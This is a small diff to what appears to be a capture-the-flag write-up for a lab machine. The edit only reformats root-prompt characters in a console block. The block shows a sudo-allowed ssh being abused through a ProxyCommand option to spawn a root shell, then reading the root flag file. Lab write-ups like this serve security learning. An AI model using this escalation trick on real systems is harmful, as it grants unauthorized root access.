@@ -346,9 +346,8 @@ Easy enough:
 
 ```console
 josh@cozyhosting:~$ sudo /usr/bin/ssh -o ProxyCommand=';sh 0<&2 1>&2' x
-## id
+# id
 uid=0(root) gid=0(root) groups=0(root)
-## cat /root/root.txt
+# cat /root/root.txt
 8acbc8[...]
-## 
 ```
